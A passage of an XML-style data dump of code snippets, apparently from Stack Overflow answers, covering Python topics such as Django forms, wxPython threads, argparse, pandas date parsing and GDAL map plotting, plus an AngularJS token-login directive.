            'forces':EuclideanDistanceExtractorDecorator(
                IndexRangeExtractor(6, 9))}

    def createExtractor(self, quantity):
        return self.extractors[quantity]


alist = [1,2,3,4,5,6,7,8,9]
ef = ExtractorFactory()
e1 = ef.createExtractor('position')
e2 = ef.createExtractor('velocity')
e3 = ef.createExtractor('forces')

print e1.extract(alist)
print e2.extract(alist)
print e3.extract(alist)
</snippet></ROW><ROW><id>20498082</id><snippet>self.mkSyllable('s')</snippet></ROW><ROW><id>20498082</id><snippet>self.add('s')</snippet></ROW><ROW><id>20498082</id><snippet>t.mkSyllable('s')</snippet></ROW><ROW><id>20498082</id><snippet>t.add('s')</snippet></ROW><ROW><id>20498127</id><snippet>ModelForm</snippet></ROW><ROW><id>20498127</id><snippet>RegisterForm.save()</snippet></ROW><ROW><id>20498127</id><snippet>title = form.cleaned_data['title']</snippet></ROW><ROW><id>20498127</id><snippet>Users.title = form.cleaned_data['title']</snippet></ROW><ROW><id>20498127</id><snippet>Users</snippet></ROW><ROW><id>20498127</id><snippet>ModelForm</snippet></ROW><ROW><id>20498127</id><snippet>Form</snippet></ROW><ROW><id>20498127</id><snippet>if form.is_valid():
    u = Users()  # create a Users instance
    u.title = form.cleaned_data['title']   # assign the title attribute 
    # ...
    u.save()   # save this Users instance
</snippet></ROW><ROW><id>20498127</id><snippet>context = {'form': RegisterForm}</snippet></ROW><ROW><id>20498127</id><snippet>form = RegisterForm()
if request.method == "POST":
    form = RegisterForm(request.POST)
    # ...
context={'form': form}
</snippet></ROW><ROW><id>20498127</id><snippet>def some_view(request):
    form = RegisterModelForm(request.POST or None)
    if form.is_valid()
        form.save()
        return redirect(...)
    context = {'form': form}
    return render_to_response('register.html', context)
</snippet></ROW><ROW><id>20498127</id><snippet>Users</snippet></ROW><ROW><id>20498127</id><snippet>Users</snippet></ROW><ROW><id>20498127</id><snippet>clean_username</snippet></ROW><ROW><id>20498127</id><snippet>unique=True</snippet></ROW><ROW><id>20498408</id><snippet>class EditableListCtrl(wx.ListCtrl, listmix.TextEditMixin, listmix.ColumnSorterMixin):

    List1Data={...dictionary item....}

    def __init__(self):

    ### your other methods now
</snippet></ROW><ROW><id>20498408</id><snippet>EditableListCtrl.List1Data
</snippet></ROW><ROW><id>20498456</id><snippet>autocomplete_light/widget.html</snippet></ROW><ROW><id>20498456</id><snippet>/path/to/autocomplete_light/templates/autocomplete_light/widget.html</snippet></ROW><ROW><id>20498456</id><snippet>autocomplete_light</snippet></ROW><ROW><id>20498456</id><snippet>TEMPLATE_DIRS</snippet></ROW><ROW><id>20498456</id><snippet>mkdir ~/your_project/templates/autocomplete_light
cp ~/env/lib/python/site-packages/autocomplete_light/templates/autocomplete_light/widget.html ~/your_project/templates/autocomplete_light
</snippet></ROW><ROW><id>20498456</id><snippet>~/your_project/templates/autocomplete_light/widget.html</snippet></ROW><ROW><id>20498456</id><snippet>autocomplete_light/static/autocomplete_light/style.css</snippet></ROW><ROW><id>20498456</id><snippet>STATICFILES_DIRS</snippet></ROW><ROW><id>20498456</id><snippet>mkdir ~/your_project/static/autocomplete_light
cp ~/env/lib/python/site-packages/autocomplete_light/static/autocomplete_light/style.css ~/your_project/static/autocomplete_light
</snippet></ROW><ROW><id>20498456</id><snippet>~/your_project/static/autocomplete_light/style.css</snippet></ROW><ROW><id>20498608</id><snippet>__eq__</snippet></ROW><ROW><id>20498608</id><snippet>def __eq__(self, other, *attributes):
    if not isinstance(other, type(self)):
        return NotImplemented

    if attributes:
        d = float('NaN')  # default that won't compare equal, even with itself
        return all(self.__dict__.get(a, d) == other.__dict__.get(a, d) for a in attributes)

    return self.__dict__ == other.__dict__
</snippet></ROW><ROW><id>20498608</id><snippet>if newInstance in myList:
</snippet></ROW><ROW><id>20498608</id><snippet>__eq__</snippet></ROW><ROW><id>20498608</id><snippet>instance1.__eq__(instance2, 'attribute1', 'attribute2')
</snippet></ROW><ROW><id>20498608</id><snippet>all()</snippet></ROW><ROW><id>20498608</id><snippet>NotImplemented</snippet></ROW><ROW><id>20498716</id><snippet>from threading import *
import wx
import time

EVT_RESULT_ID = wx.NewId()

def EVT_RESULT(win, func):
    win.Connect(-1, -1, EVT_RESULT_ID, func)

class MyGui(wx.Frame):
    def __init__(self):
        self.spellchkthrd = None
        #lots of stuff

        self.input = wx.TextCtrl(self.panel, -1, "", size=(200, 150), style=wx.TE_MULTILINE|wx.TE_LEFT|wx.TE_RICH)        
        self.Bind(wx.EVT_TEXT, self.OnEdit, self.input)
        EVT_RESULT(self, self.OnSplCheck)    

    def OnEdit(self, event):
        if not self.spellchkthrd:
            self.spellchkthrd = SpellCheckThread(self)  
        else:
            self.spellchkthrd.newSig()

    def OnSplCheck(self, event):
        self.spellchkthrd = None
        #All the spell checking stuff

class ResultEvent(wx.PyEvent):
    def __init__(self):
        wx.PyEvent.__init__(self)
        self.SetEventType(EVT_RESULT_ID)

class SpellCheckThread(Thread):
    def __init__(self, panel):
        Thread.__init__(self)
        self.count = 0
        self.panel = panel
        self.start()

    def run(self):
        while self.count &lt; 1.0:
            print self.count
            time.sleep(0.1)            
            self.count += 0.1

        wx.PostEvent(self.panel, ResultEvent())

    def newSig(self):
        print "new"
        self.count = 0
</snippet></ROW><ROW><id>20498762</id><snippet>subprocess.check_output</snippet></ROW><ROW><id>20498762</id><snippet>subprocess.Popen.communicate</snippet></ROW><ROW><id>20498762</id><snippet>out1, err1 = subprocess.Popen(cmd1,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE).communicate()
</snippet></ROW><ROW><id>20498808</id><snippet>    Extra arguments passed to func, i.e. f(x,*args).
</snippet></ROW><ROW><id>20498808</id><snippet>fmin_result = optimize.fmin(helper, x0=[m_initial], args=(data,))
</snippet></ROW><ROW><id>20498808</id><snippet>Optimization terminated successfully.
         Current function value: -0.000000
         Iterations: 16
         Function evaluations: 32
[ 5.53610656]
</snippet></ROW><ROW><id>20498812</id><snippet>files = [x for x in os.listdir('.') if os.path.isfile(x)]
</snippet></ROW><ROW><id>20498812</id><snippet>files</snippet></ROW><ROW><id>20498812</id><snippet>.</snippet></ROW><ROW><id>20498812</id><snippet>files.sort(key=lambda f: int(re.search("(\d+)", f).group(1)))
</snippet></ROW><ROW><id>20498812</id><snippet>files</snippet></ROW><ROW><id>20498812</id><snippet>def grouper(iterable, n, fillvalue=None):
    "Collect data into fixed-length chunks or blocks"
    # grouper('ABCDEFG', 3, 'x') --&gt; ABC DEF Gxx
    args = [iter(iterable)] * n
    return izip_longest(fillvalue=fillvalue, *arg)
</snippet></ROW><ROW><id>20498812</id><snippet>&gt;&gt;&gt; for f in grouper(files, 2):
...    print f # f here is a tuple of two files. f[0] is the first and f[1] is the second one
... 
('info_scan1.csv', 'info_scan2.csv')
('info_scan3.csv', 'info_scan4.csv')
('info_scan5.csv', 'info_scan6.csv')
('info_scan7.csv', 'info_scan8.csv')
('info_scan9.csv', 'info_scan12.csv')
('info_scan57.csv', 'info_scan58.csv')
</snippet></ROW><ROW><id>20499144</id><snippet>rows = [row1,row2,row3,row4,row5]  # you'd generate rows in a cleaner way    

cols = list(zip(*rows))

printedxrows = [ ("[X]","[X]","[X]","[X]","[X]","  &lt;- V: {}   TOTAL: {}"
                                               .format(row.count(0), sum(row)))
                 for row in rows ]
</snippet></ROW><ROW><id>20499150</id><snippet>if any(ord(x) &gt; 127 for x in line)....
</snippet></ROW><ROW><id>20499150</id><snippet>import re
if re.search(r'[\x80-\xFF]', line)...
</snippet></ROW><ROW><id>20499150</id><snippet>for line in file:
   fields = line.split('\t')
   if len(fields) != &lt;expected number of fields&gt;:
        # invalid line
        continue
   try:
       k = int(fields[&lt;field number&gt;]
   except ValueError:
       # invalid line
       continue
    if k &lt; &lt;threshold&gt;:
       # skip it
       continue
    # now process the line
</snippet></ROW><ROW><id>20499331</id><snippet>from mpl_toolkits.basemap import Basemap
import osr, gdal
import matplotlib.pyplot as plt
import numpy as np
</snippet></ROW><ROW><id>20499331</id><snippet>def convertXY(xy_source, inproj, outproj):
    # function to convert coordinates

    shape = xy_source[0,:,:].shape
    size = xy_source[0,:,:].size

    # the ct object takes and returns pairs of x,y, not 2d grids
    # so the the grid needs to be reshaped (flattened) and back.
    ct = osr.CoordinateTransformation(inproj, outproj)
    xy_target = np.array(ct.TransformPoints(xy_source.reshape(2, size).T))

    xx = xy_target[:,0].reshape(shape)
    yy = xy_target[:,1].reshape(shape)

    return xx, yy
</snippet></ROW><ROW><id>20499331</id><snippet># Read the data and metadata
ds = gdal.Open(r'albers_5km.tif')

data = ds.ReadAsArray()
gt = ds.GetGeoTransform()
proj = ds.GetProjection()

xres = gt[1]
yres = gt[5]

# get the edge coordinates and add half the resolution 
# to go to center coordinates
xmin = gt[0] + xres * 0.5
xmax = gt[0] + (xres * ds.RasterXSize) - xres * 0.5
ymin = gt[3] + (yres * ds.RasterYSize) + yres * 0.5
ymax = gt[3] - yres * 0.5

ds = None

# create a grid of xy coordinates in the original projection
xy_source = np.mgrid[xmin:xmax+xres:xres, ymax+yres:ymin:yres]
</snippet></ROW><ROW><id>20499331</id><snippet># Create the figure and basemap object
fig = plt.figure(figsize=(12, 6))
m = Basemap(projection='robin', lon_0=0, resolution='c')

# Create the projection objects for the convertion
# original (Albers)
inproj = osr.SpatialReference()
inproj.ImportFromWkt(proj)

# Get the target projection from the basemap object
outproj = osr.SpatialReference()
outproj.ImportFromProj4(m.proj4string)

# Convert from source projection to basemap projection
xx, yy = convertXY(xy_source, inproj, outproj)

# plot the data (first layer)
im1 = m.pcolormesh(xx, yy, data[0,:,:].T, cmap=plt.cm.jet)

# annotate
m.drawcountries()
m.drawcoastlines(linewidth=.5)

plt.savefig('world.png',dpi=75)
</snippet></ROW><ROW><id>20499349</id><snippet>TruncatedSVD</snippet></ROW><ROW><id>20499349</id><snippet>as_float_array()</snippet></ROW><ROW><id>20499349</id><snippet>sklearn.utils</snippet></ROW><ROW><id>20499349</id><snippet>as_float_array()</snippet></ROW><ROW><id>20499349</id><snippet>as_float_array</snippet></ROW><ROW><id>20499370</id><snippet>&gt;&gt;&gt; lst = ['a', 'b', 'c']
&gt;&gt;&gt; i = lst.index('b') # This raises ValueError if there's no 'b' in the list.
&gt;&gt;&gt; lst[i:i+1] = 'b1', 'b2', 'b3'
&gt;&gt;&gt; lst
['a', 'b1', 'b2', 'b3', 'c']
</snippet></ROW><ROW><id>20499414</id><snippet>nargs</snippet></ROW><ROW><id>20499414</id><snippet>add_argument</snippet></ROW><ROW><id>20499414</id><snippet>import argparse
parser = argparse.ArgumentParser(description="Hello")
group = parser.add_mutually_exclusive_group()
group.add_argument('--period', action='store')
group.add_argument('--df_dt', nargs='+')
args = parser.parse_args()
</snippet></ROW><ROW><id>20499414</id><snippet>program.py --period &lt;period&gt;
program.py --df_dt &lt;df&gt; &lt;dt&gt;
</snippet></ROW><ROW><id>20499414</id><snippet>df = args.df_dt[0]
dt = args.df_dt[1]
</snippet></ROW><ROW><id>20499503</id><snippet>logging</snippet></ROW><ROW><id>20499503</id><snippet>import logging

log = logging.getLogger(__name__)

# ...
log.warn('Do not fnord the frazzle, faf the frobnir instead')
</snippet></ROW><ROW><id>20499644</id><snippet>try:
    # ...
except Exception as e:
    print("What you want to show")
</snippet></ROW><ROW><id>20499644</id><snippet>try</snippet></ROW><ROW><id>20499644</id><snippet>except</snippet></ROW><ROW><id>20499644</id><snippet>wget()</snippet></ROW><ROW><id>20499644</id><snippet>except Exception as e:
    print("Exception caught!")
    exit(1)
</snippet></ROW><ROW><id>20499644</id><snippet>while True:
    try:
        # Your logic ...
        break
    except:
        print 'No input or wrong url format usage: http://wwww.domainname.com '
        print 'Try again!'
</snippet></ROW><ROW><id>20499904</id><snippet>class Animal(object):

    def __init__(self, name ):
        self.name = name 

zebra = Animal("Jeffrey")

print zebra.name
</snippet></ROW><ROW><id>20499923</id><snippet>pyvirtualdisplay</snippet></ROW><ROW><id>20499923</id><snippet>xvfb</snippet></ROW><ROW><id>20499923</id><snippet>xephyr</snippet></ROW><ROW><id>20499923</id><snippet>sudo apt-get install xvfb xserver-xephyr</snippet></ROW><ROW><id>20499923</id><snippet>time.sleep()</snippet></ROW><ROW><id>20499923</id><snippet>import time
from pyvirtualdisplay import Display
from selenium import webdriver

display = Display(visible=0, size=(1024, 768))
display.start()

browser = webdriver.Firefox()
actions = webdriver.ActionChains(browser)
browser.get('some_url_I_need')
time.sleep(5) # sleep for 5 seconds
content = browser.find_element_by_id('content') # Error on this line
</snippet></ROW><ROW><id>20499923</id><snippet>browser.implicitly_wait(30)</snippet></ROW><ROW><id>20499923</id><snippet>from pyvirtualdisplay import Display
from selenium import webdriver

display = Display(visible=0, size=(1024, 768))
display.start()

browser = webdriver.Firefox()
browser.implicitly_wait(30) # seconds
actions = webdriver.ActionChains(browser)
browser.get('some_url_I_need')
content = browser.find_element_by_id('content') # Error on this line
</snippet></ROW><ROW><id>20500139</id><snippet>GtkDrawingArea</snippet></ROW><ROW><id>20500139</id><snippet>import gtk

class Test:

    def main(self):
        self.w = gtk.Window(gtk.WINDOW_TOPLEVEL)
        self.w.modify_bg(gtk.STATE_NORMAL, gtk.gdk.Color(0, 0, 0))
        self.drawing =  gtk.DrawingArea()
        self.drawing.modify_bg(gtk.STATE_NORMAL, gtk.gdk.Color('#0000ff'))   
        self.w.add(self.drawing)
        self.w.show_all()
        self.w.connect("destroy", gtk.main_quit)
        gtk.main()

if __name__ == '__main__':
    a = Test()
    a.main()
</snippet></ROW><ROW><id>20500180</id><snippet>className</snippet></ROW><ROW><id>20500180</id><snippet>assetEntryQuery.setClassName(BlogsEntry.class.getName());</snippet></ROW><ROW><id>20500196</id><snippet>&gt;&gt;&gt; def whatsup(x):
...     return "whats up " + x
... print(whatsup("tony"))
  File "&lt;stdin&gt;", line 3
    print(whatsup("tony"))
        ^
SyntaxError: invalid syntax
</snippet></ROW><ROW><id>20500196</id><snippet>&gt;&gt;&gt; def whatsup(x):
...     return "whats up " + x
... 
&gt;&gt;&gt; print(whatsup("tony"))
whats up tony
</snippet></ROW><ROW><id>20500387</id><snippet>s1P</snippet></ROW><ROW><id>20500387</id><snippet>s1P = [4.51775*10.0**16.0]
</snippet></ROW><ROW><id>20500387</id><snippet>s1P = 4.51775*10.0**16.0</snippet></ROW><ROW><id>20500401</id><snippet>dump</snippet></ROW><ROW><id>20500401</id><snippet>tostring</snippet></ROW><ROW><id>20500401</id><snippet>ET.tostring(root)
</snippet></ROW><ROW><id>20500401</id><snippet>ET.tostring(root, pretty_print=True)
</snippet></ROW><ROW><id>20500497</id><snippet>display</snippet></ROW><ROW><id>20500497</id><snippet>xv</snippet></ROW><ROW><id>20500497</id><snippet>imagemagick</snippet></ROW><ROW><id>20500498</id><snippet>.directive('login', function ($http, $cookieStore, authService) {
return {
  restrict: 'A',
  link: function (scope, elem, attrs) {

    elem.bind('submit', function () {
      var user_data = {
            "username": scope.username,
            "password": scope.password,
      };

      $http.post(constants.serverAddress + "api-token-auth", user_data, {"Authorization": ""})
          .success(function(response) {
              $cookieStore.put('djangotoken', response.token);
              $http.defaults.headers.common['Authorization'] = 'Token ' + response.token;
              authService.loginConfirmed();
          });
    });
  }
}
</snippet></ROW><ROW><id>20500498</id><snippet>.run(function($rootScope) {
  $rootScope.$broadcast('event:initial-auth');
})
</snippet></ROW><ROW><id>20500498</id><snippet>.directive('authApplication', function ($cookieStore, $http) {
    return {
        restrict: 'A',
        link: function (scope, elem, attrs) {

          var login = elem.find('#login-holder');
          var main = elem.find('#main');

          scope.$on('event:auth-loginRequired', function () {
            main.hide();
            login.slideDown('fast');
          });

          scope.$on('event:auth-loginConfirmed', function () {
            main.show();
            login.slideUp('fast');
          });

          scope.$on('event:initial-auth', function () {
             if ($cookieStore.get('djangotoken')) {
               $http.defaults.headers.common['Authorization'] = 'Token ' + $cookieStore.get('djangotoken');
             }
             else {
               login.slideDown('fast');
               main.hide();
             }
          });
        }
     }
  })
</snippet></ROW><ROW><id>20500498</id><snippet>&lt;body auth-application&gt;
  &lt;div id="login-holder"&gt;
    ... login form
  &lt;/div&gt;

  &lt;div id="main"&gt;
    ... ng-view, or the bulk of your html
  &lt;/div&gt;
</snippet></ROW><ROW><id>20500806</id><snippet>__enter__()</snippet></ROW><ROW><id>20500806</id><snippet>__exit__()</snippet></ROW><ROW><id>20500806</id><snippet>__call__</snippet></ROW><ROW><id>20500819</id><snippet>import datetime
from io import StringIO
import pandas

datafile = StringIO("""\
jday,value
2013-01,1
2013-02,2
2013-100,8
2013-200,9
""")

dateparser = lambda x: datetime.datetime.strptime(x, '%Y-%j')
df = pandas.read_csv(datafile, parse_dates=True, date_parser=dateparser, index_col=[0])
</snippet></ROW><ROW><id>20500819</id><snippet>df</snippet></ROW><ROW><id>20500819</id><snippet>            value
jday             
2013-01-01      1
2013-01-02      2
2013-04-10      8
2013-07-19      9
</snippet></ROW><ROW><id>20500913</id><snippet>enumerate()</snippet></ROW><ROW><id>20500913</id><snippet>for i, c in enumerate(letters):
    if c == input:
        # i is the position.
</snippet></ROW><ROW><id>20500913</id><snippet>i = 0
for c in letters:
    if c == input:
        # i is the position
    i += 1
</snippet></ROW><ROW><id>20500913</id><snippet>xrange(len(letters))</snippet></ROW><ROW><id>20500913</id><snippet>for i in range(len(letters)):
    if letters[i] == input:
        # i is the position
</snippet></ROW><ROW><id>20500913</id><snippet>enumerate()</snippet></ROW><ROW><id>20500917</id><snippet>ast.parse</snippet></ROW><ROW><id>20500917</id><snippet>&gt;&gt;&gt; import ast
&gt;&gt;&gt; ast.parse('print 1')   # does not execute
&lt;_ast.Module at 0x222af10&gt;

&gt;&gt;&gt; ast.parse('garbage(')
File "&lt;unknown&gt;", line 1
   garbage(
           ^
SyntaxError: unexpected EOF while parsing
</snippet></ROW></DATA>